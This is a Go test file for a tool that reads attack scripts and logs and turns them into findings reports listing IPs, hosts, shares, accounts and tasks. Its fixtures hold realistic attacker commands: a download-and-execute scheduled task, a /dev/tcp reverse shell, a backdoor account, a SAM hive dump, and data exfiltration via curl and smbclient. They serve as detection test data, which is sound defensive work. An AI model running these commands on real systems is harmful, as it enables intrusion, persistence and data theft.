package command

import (
	"os"
	"path/filepath"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"testing"

	"github.com/get-sybers/slopmop/internal/evidencetest"
	"github.com/get-sybers/slopmop/internal/render"
)

// shownWhat reads the Findings section of a readout: each activity with
// the lines it writes under what.
func shownWhat(t *testing.T, readout string) map[string][]string {
	t.Helper()
	_, section, found := strings.Cut(readout, "\nFindings\n")
	if !found {
		t.Fatalf("the readout has no findings:\n%s", readout)
	}
	entry := regexp.MustCompile(`^    \[.\] (\S+) `)
	shown := map[string][]string{}
	name := ""
	for _, line := range strings.Split(section, "\n") {
		switch m := entry.FindStringSubmatch(line); {
		case m != nil:
			name = m[1]
		case strings.HasPrefix(line, "        "):
			shown[name] = append(shown[name], strings.TrimPrefix(strings.TrimSpace(line), "what  "))
		case line != "" && !strings.HasPrefix(line, " "):
			return shown
		}
	}
	return shown
}

// The saved findings hold what the report writes under what: the report
// its first lines and the count of the rest, the saved findings every line,
// in a cell of CSV side by side.
func TestFindingsHoldWhatTheReportWrites(t *testing.T) {
	for _, fixture := range evidencetest.List() {
		t.Run(fixture, func(t *testing.T) {
			readout, saved := report(t, evidencetest.Copy(t, fixture), "findings")
			shown := shownWhat(t, readout)
			table := rows(t, filepath.Join(saved, "findings.json"))
			sheet := rows(t, filepath.Join(saved, "findings.csv"))
			if len(sheet) != len(table) || len(shown) == 0 {
				t.Fatalf("findings.csv holds %d rows, findings.json %d and the report %d activities", len(sheet), len(table), len(shown))
			}
			for i, row := range table {
				what, _ := row["what"].(string)
				name, _ := row["finding"].(string)
				lines, isActivity := shown[name]
				if row["indicator"] != nil || !isActivity {
					if row["what"] != nil || row["targets"] != nil {
						t.Errorf("%s %v: what = %v and targets = %v, want neither on a row the report lists no lines for", name, row["indicator"], row["what"], row["targets"])
					}
					continue
				}
				all := strings.Split(what, "\n")
				want := all
				if len(all) > fewFindingLines {
					want = append(slices.Clone(all[:fewFindingLines]), "and "+strconv.Itoa(len(all)-fewFindingLines)+" more in the saved findings")
				}
				if !slices.Equal(lines, want) {
					t.Errorf("%s: the report writes %q under what, and the saved findings hold %q", name, lines, all)
				}
				cells := make([]string, len(all))
				for n, line := range all {
					cells[n] = render.Escape(line)
				}
				if got := sheet[i]["what"]; got != strings.Join(cells, "; ") {
					t.Errorf("%s: the cell of findings.csv is %q, want the lines %q side by side", name, got, all)
				}
				delete(shown, name)
			}
			if len(shown) != 0 {
				t.Errorf("the report lists activities the saved findings lack: %v", shown)
			}
		})
	}
}

// pivots writes a folder whose lines name addresses, hosts, accounts, a
// tenant, a task, shares and archives: in variables, on a line a command is
// continued on, twice in a file, and in a record that has no line.
func pivots(t *testing.T) string {
	t.Helper()
	folder := t.TempDir()
	for name, text := range map[string]string{
		"20261101_090000_step01_token.sh": "#!/bin/bash\nTENANT=11111111-2222-4333-8444-555555555555\nAPP=66666666-7777-4888-9999-000000000000\nPROXY=203.0.113.9\n" +
			"curl -s -x http://$PROXY:8080 \\\n  -d \"client_id=$APP\" -d \"grant_type=client_credentials\" \\\n" +
			"  \"https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token\" --resolve login.microsoftonline.com:443:203.0.113.77\n",
		"20261101_091000_step02_persist.ps1": "$c2 = '203.0.113.50'\nInvoke-WebRequest http://203.0.113.50/ping | Out-Null\n" +
			"schtasks /create /s dc01.corp.local /u corp\\admin /p Passw0rd!23 /ru corp\\svc_task /sc onlogon /tn \"WindowsUpdateCheck\" /tr \"powershell -ep bypass -c IEX (iwr http://203.0.113.50/u.ps1)\"\n" +
			"net user backdoor P@ssw0rd123 /add\n",
		"20261101_092000_step03_shell.py": "H = \"203.0.113.41\"\nPORT = 4444\nimport os\nos.system(\"exec 3<>/dev/tcp/$H/$PORT\")\n",
		"20261101_093000_step04_mail.sh": "#!/bin/bash\n" +
			"curl -s -H \"Authorization: Bearer $T\" \"https://graph.microsoft.com/v1.0/users/alice@corp.example/messages\" -o mail.json\n" +
			"curl -T mail.json \"https://$USER@drop.example.net/in/\"\n",
		"20261101_093500_step05_stage.ps1": "$fs = 'fs01.corp.local'\n" +
			"Compress-Archive -Path C:\\Users\\Public\\loot -DestinationPath \\\\$fs\\finance\\loot.zip\n" +
			"rundll32.exe \\\\10.20.1.9\\stage\\a.dll,Start\n" +
			"reg save HKLM\\SAM \\\\10.20.1.9\\stage\\sam.save\n",
		"20261101_093700_step06_send.sh": "#!/bin/bash\n" +
			"tar czf /tmp/fin.tgz /srv/finance && smbclient //10.20.1.5/loot$ -U 'corp/svc%Winter2025!' -c 'put /tmp/fin.tgz fin.tgz'\n",
		"audit_20261101_094000.jsonl": `{"cmd": "useradd -m -s /bin/bash helper"}` + "\n" +
			`{"cmd": "curl -T /tmp/loot.tgz https://files.example.net/up --connect-to ::198.51.100.7:"}` + "\n",
	} {
		if err := os.WriteFile(filepath.Join(folder, name), []byte(text), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return folder
}

// A finding names what its lines act on and hold, each in the column of its
// kind; an indicator names itself, and a tactic nothing.
func TestFindingsNameWhatTheirLinesHold(t *testing.T) {
	_, saved := report(t, pivots(t), "summary")
	table := rows(t, filepath.Join(saved, "findings.json"))
	sheet := rows(t, filepath.Join(saved, "findings.csv"))
	columns := []string{
		"targets", "ip", "host", "port", "url", "share", "account", "tenant", "application", "role", "resource", "vault",
		"secret", "key", "task", "service", "process", "command", "file", "archive", "log", "registry",
	}
	tests := []struct {
		finding, indicator string
		want               map[string]string
	}{
		// A variable is given its value, and a command is read on every line it is continued on.
		{"TokenRequest", "", map[string]string{
			"targets":     "tenant 11111111-2222-4333-8444-555555555555 ($TENANT); client 66666666-7777-4888-9999-000000000000 ($APP)",
			"ip":          "203.0.113.9, 203.0.113.77",
			"url":         "http://203.0.113.9:8080, https://login.microsoftonline.com/11111111-2222-4333-8444-555555555555/oauth2/v2.0/token",
			"tenant":      "11111111-2222-4333-8444-555555555555",
			"application": "66666666-7777-4888-9999-000000000000",
		}},
		// An address is of the line that names it, wherever its file names it first.
		{"ScheduledTaskCreation", "", map[string]string{
			"targets": "task WindowsUpdateCheck; runs powershell -ep bypass -c IEX (iwr http://203.0.113.50/u.ps1",
			"ip":      "203.0.113.50", "host": "dc01.corp.local", "url": "http://203.0.113.50/u.ps1",
			"account": "admin, svc_task", "task": "WindowsUpdateCheck",
			"command": "powershell -ep bypass -c IEX (iwr http://203.0.113.50/u.ps1",
		}},
		// A subject that is a variable is listed by its value, and is an address where it holds one.
		{"ReverseShell", "", map[string]string{
			"targets": "host 203.0.113.41 ($H); port 4444 ($PORT)", "ip": "203.0.113.41", "host": "203.0.113.41", "port": "4444",
		}},
		// A record of a structured output has no line, and names what is quoted of it.
		{"AccountCreation", "", map[string]string{"targets": "account backdoor; account helper", "account": "backdoor, helper"}},
		// A host of a vendor is none, and a domain is a host where a script names it.
		{"MailboxAccess", "", map[string]string{
			"targets": "mailbox alice@corp.example", "account": "alice@corp.example", "host": "corp.example",
			"url": "https://graph.microsoft.com/v1.0/users/alice@corp.example/messages",
		}},
		// A variable before an at sign is no account, and an output names no host by a domain.
		{"FileUpload", "", map[string]string{
			"targets": "url https://$USER@drop.example.net/in/; file mail.json; url https://files.example.net/up; file /tmp/loot.tgz",
			"ip":      "198.51.100.7", "host": "drop.example.net", "url": "https://$USER@drop.example.net/in/, https://files.example.net/up",
			"file": "mail.json, /tmp/loot.tgz",
		}},
		// A share is one value whichever way its slashes lean, with the value of the variable its host is.
		{"ArchiveCreation", "", map[string]string{
			"targets": `archive \\$fs\finance\loot.zip; archive /tmp/fin.tgz`,
			"ip":      "10.20.1.5", "host": "fs01.corp.local", "share": `\\fs01.corp.local\finance, \\10.20.1.5\loot$`,
			"archive": `\\fs01.corp.local\finance\loot.zip, /tmp/fin.tgz`,
		}},
		// A line names the share of any path on it, whatever the activity acts on.
		{"SignedBinaryProxyExecution", "", map[string]string{
			"targets": "binary rundll32", "ip": "10.20.1.9", "share": `\\10.20.1.9\stage`, "process": "rundll32",
		}},
		{"RegistryHiveDump", "", map[string]string{
			"targets": `hive HKLM\SAM; file \\10.20.1.9\stage\sam.save`, "ip": "10.20.1.9", "share": `\\10.20.1.9\stage`,
			"file": `\\10.20.1.9\stage\sam.save`, "registry": `HKLM\SAM`,
		}},
		{"IPv4", "203.0.113.41", map[string]string{"ip": "203.0.113.41"}},
		{"Domain", "graph.microsoft.com", map[string]string{"host": "graph.microsoft.com"}},
		{"Email", "alice@corp.example", map[string]string{"account": "alice@corp.example"}},
		{"URL", "http://203.0.113.50/ping", map[string]string{"url": "http://203.0.113.50/ping"}},
		{"GUID", "11111111-2222-4333-8444-555555555555", nil},
	}
	for _, tt := range tests {
		want := map[string]string{"finding": tt.finding}
		if tt.indicator != "" {
			want["indicator"] = tt.indicator
		}
		for name, table := range map[string][]map[string]any{"findings.json": table, "findings.csv": sheet} {
			row := find(t, table, want)
			for _, column := range columns {
				if got, _ := row[column].(string); got != tt.want[column] {
					t.Errorf("%s: %s %s: %s = %q, want %q", name, tt.finding, tt.indicator, column, got, tt.want[column])
				}
			}
		}
	}
	tactics := 0
	for _, row := range table {
		if row["finding"] != kindTactic {
			continue
		}
		tactics++
		for _, column := range append([]string{"what"}, columns...) {
			if row[column] != nil {
				t.Errorf("the tactic %v: %s = %v, want nothing", row["tactic"], column, row[column])
			}
		}
	}
	if tactics == 0 {
		t.Errorf("findings.json holds no tactic")
	}
}

// A share is found by how a command writes it, and is written one way: a
// path of Windows, the same in a string that doubles each backslash, the
// path a tool of SMB is given, and an address of smb.
func TestSharesAreFoundByTheirShape(t *testing.T) {
	v, doc := reportSpec(t)
	if _, err := (Env{}).reportVerb(v, doc); err != nil {
		t.Fatal(err)
	}
	pipe, err := loadPipeline()
	if err != nil {
		t.Fatal(err)
	}
	if pipe.entities, err = loadEntities(doc, pipe); err != nil {
		t.Fatal(err)
	}
	tests := []struct {
		name, text string
		want       []string
	}{
		{"a drive mapped to a share", `net use Z: \\fs01.corp.local\finance /user:corp\svc Winter2025!`, []string{`\\fs01.corp.local\finance`}},
		{"a file below an admin share", `copy a.exe \\10.20.1.5\C$\Windows\Temp\a.exe`, []string{`\\10.20.1.5\C$`}},
		{"a share in quotes", `New-PSDrive -Name X -PSProvider FileSystem -Root "\\10.20.1.23\ADMIN$"`, []string{`\\10.20.1.23\ADMIN$`}},
		{"a hidden share with a dot in its name", `dir \\fs01\hr.2026$\payroll`, []string{`\\fs01\hr.2026$`}},
		{"a host that is a variable no file sets", `foreach ($h in $hosts) { copy a.exe \\$h\C$\Temp }`, []string{`\\$h\C$`}},
		{"a host that is a variable of a batch file", `copy a.exe \\%TARGET%\ADMIN$\a.exe`, []string{`\\%TARGET%\ADMIN$`}},
		{"two shares on a line", `robocopy \\fs01\finance \\10.20.1.9\stage /E`, []string{`\\fs01\finance`, `\\10.20.1.9\stage`}},
		{"a share after a redirect", `whoami >\\10.20.1.9\stage\who.txt`, []string{`\\10.20.1.9\stage`}},
		{"a string that doubles each backslash", `shutil.copy("a.exe", "\\\\dc01\\C$\\Windows\\a.exe")`, []string{`\\dc01\C$`}},
		{"the path smbclient is given", `smbclient //10.20.1.5/C$ -U 'corp/administrator%P@ss' -c 'get x'`, []string{`\\10.20.1.5\C$`}},
		{"the path mount is given", `mount -t cifs //fs01.corp.local/finance /mnt/fin -o username=svc`, []string{`\\fs01.corp.local\finance`}},
		{"an address of smb", `smbget -R smb://svc@fs01/hr$/payroll`, []string{`\\fs01\hr$`}},
		{"a host alone", `net view \\dc01.corp.local /all`, nil},
		{"a listing of the shares of a host", `smbclient -L //10.20.1.5 -U svc`, nil},
		{"a key of the registry", `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater`, nil},
		{"a path that doubles each backslash", `open("C:\\Users\\Public\\a.exe")`, nil},
		{"a path with one backslash doubled", `type C:\\Users\Public\a.txt`, nil},
		{"a namespace of WMI", `wmic /namespace:\\root\cimv2 path win32_process get name`, nil},
		{"a pipe and a device", `echo x > \\.\pipe\lsass && dir \\?\C:\Windows`, nil},
		{"an address of the web", `curl -T out.tgz https://files.example.net/up`, nil},
		{"two slashes without a tool of SMB", `git clone //fs01/repo && xmllint --xpath //div/span a.html`, nil},
		{"escapes of a string", `printf "a\\nb\\tc" | sed 's/\\\\/\//g' | grep -E "\\d+\\.\\d+"`, nil},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var got []string
			for _, m := range pipe.mentions(tt.text, nil, true) {
				if m.column == "share" {
					got = append(got, m.value)
				}
			}
			if !slices.Equal(got, tt.want) {
				t.Errorf("the shares of %q are %q, want %q", tt.text, got, tt.want)
			}
		})
	}
}

// A command that was cut is read without the word the cut ended in.
func TestWhole(t *testing.T) {
	long := strings.Repeat("a ", mostRead/2)
	tests := []struct {
		name, text, want string
	}{
		{"a command that is whole", "ping 198.51.100.200", "ping 198.51.100.200"},
		{"a command cut inside an address", "ping 198.51.100.2...", "ping "},
		{"a command cut after a space", "ping 198.51.100.200 ...", "ping 198.51.100.200 "},
		{"a word alone that was cut", "198.51.100.2...", ""},
		{"nothing", "", ""},
		{"more than is read", long + "198.51.100.200", long},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := whole(tt.text); got != tt.want {
				t.Errorf("whole(%q) = %q, want %q", tt.text, got, tt.want)
			}
		})
	}
}

// The entities of commands.json fill columns of the findings from what the
// other tables declare, and no two read the same.
func TestLoadEntitiesRejects(t *testing.T) {
	const finding = 2
	tests := []struct {
		name   string
		damage func(doc *commandsDoc)
		want   string
	}{
		{"a column the class lacks", func(doc *commandsDoc) { doc.Classes[finding].Entities[0].Column = "bogus" }, `the entity "bogus" is no column`},
		{"an entity twice", func(doc *commandsDoc) { doc.Classes[finding].Entities[1].Column = "ip" }, `the entity "ip" is named twice`},
		{"an entity that reads nothing", func(doc *commandsDoc) { doc.Classes[finding].Entities[0] = entitySpec{Column: "ip"} }, `the entity "ip" reads nothing`},
		{"an unknown label", func(doc *commandsDoc) { doc.Classes[finding].Entities[1].Labels = []string{"bogus"} }, `reads the label "bogus", which its table lacks`},
		{"an unknown kind", func(doc *commandsDoc) { doc.Classes[finding].Entities[0].Kinds = []string{"bogus"} }, `reads the kind of exposure "bogus", which its table lacks`},
		{"an unknown type", func(doc *commandsDoc) { doc.Classes[finding].Entities[0].Indicators = []string{"bogus"} }, `reads the indicator type "bogus", which its table lacks`},
		{"a label read twice", func(doc *commandsDoc) { doc.Classes[finding].Entities[2].Labels = []string{"host"} }, `reads the label "host", which another reads`},
		{"a kind read twice", func(doc *commandsDoc) { doc.Classes[finding].Entities[1].Kinds = []string{"ip"} }, `reads the kind of exposure "ip", which another reads`},
		{"a type read twice", func(doc *commandsDoc) { doc.Classes[finding].Entities[1].Indicators = []string{"IPv4"} }, `reads the indicator type "IPv4", which another reads`},
		{"a pattern that does not compile", func(doc *commandsDoc) {
			doc.Classes[finding].Entities[0].Patterns = []shapeSpec{{Pattern: "(", Value: "${x}"}}
		}, `the entity "ip": error parsing regexp`},
		{"a value of a group the pattern lacks", func(doc *commandsDoc) {
			doc.Classes[finding].Entities[0].Patterns = []shapeSpec{{Pattern: "(?P<host>a)", Value: "${host} ${share}"}}
		}, `writes "${host} ${share}", which names a group its pattern lacks`},
		{"a value with a dollar that names nothing", func(doc *commandsDoc) {
			doc.Classes[finding].Entities[0].Patterns = []shapeSpec{{Pattern: "(?P<host>a)", Value: "$host"}}
		}, `which names a group its pattern lacks`},
		{"a value of no group", func(doc *commandsDoc) {
			doc.Classes[finding].Entities[0].Patterns = []shapeSpec{{Pattern: "(?P<host>a)", Value: "share"}}
		}, `writes "share", which names no group of its pattern`},
		{"entities of another class", func(doc *commandsDoc) { doc.Classes[0].Entities = doc.Classes[finding].Entities }, "the class file names entities"},
		{"a column no entity fills", func(doc *commandsDoc) { doc.Classes[finding].Entities = doc.Classes[finding].Entities[1:] }, "the class finding declares 34 columns and fills 33"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			v, doc := reportSpec(t)
			if doc.Classes[finding].Name != findingClass {
				t.Fatalf("the class %d of commands.json is %s, want %s", finding, doc.Classes[finding].Name, findingClass)
			}
			tt.damage(&doc)
			if _, err := (Env{}).reportVerb(v, doc); err == nil || !strings.Contains(err.Error(), tt.want) {
				t.Errorf("reportVerb error = %v, want one containing %q", err, tt.want)
			}
		})
	}
}

// The columns that list what a finding names are those the table fills, and
// each label, kind and type it reads leads to one of them.
func TestEntitiesFillTheirColumns(t *testing.T) {
	v, doc := reportSpec(t)
	if _, err := (Env{}).reportVerb(v, doc); err != nil {
		t.Fatal(err)
	}
	pipe, err := loadPipeline()
	if err != nil {
		t.Fatal(err)
	}
	table, err := loadEntities(doc, pipe)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{
		"ip", "host", "port", "url", "share", "account", "tenant", "application", "role", "resource", "vault", "secret", "key",
		"task", "service", "process", "command", "file", "archive", "log", "registry",
	}
	if !slices.Equal(table.columns, want) {
		t.Errorf("the entities fill %q, want %q", table.columns, want)
	}
	// What an activity acts on has a column, whatever its label: none is in targets alone.
	for _, label := range pipe.activities.Labels() {
		if table.byLabel[label] == "" {
			t.Errorf("no entity reads the label %q, so what it names is in no column", label)
		}
	}
	if len(table.shapes) == 0 || table.shapes[0].column != "share" {
		t.Errorf("the shapes are %+v, want those that find a share", table.shapes)
	}
	for name, by := range map[string]map[string]string{"labels": table.byLabel, "kinds": table.byKind, "types": table.byType} {
		for read, column := range by {
			if !slices.Contains(table.columns, column) {
				t.Errorf("the %s lead %q to %q, which is no column of the table", name, read, column)
			}
		}
	}
	// An address and a domain are read as the exposure reads them; a URL is filed by its type.
	if table.apart["IPv4"] || table.apart["Domain"] || table.apart["Email"] || !table.apart["URL"] {
		t.Errorf("apart = %v, want the types the exposure does not read and no other", table.apart)
	}
}
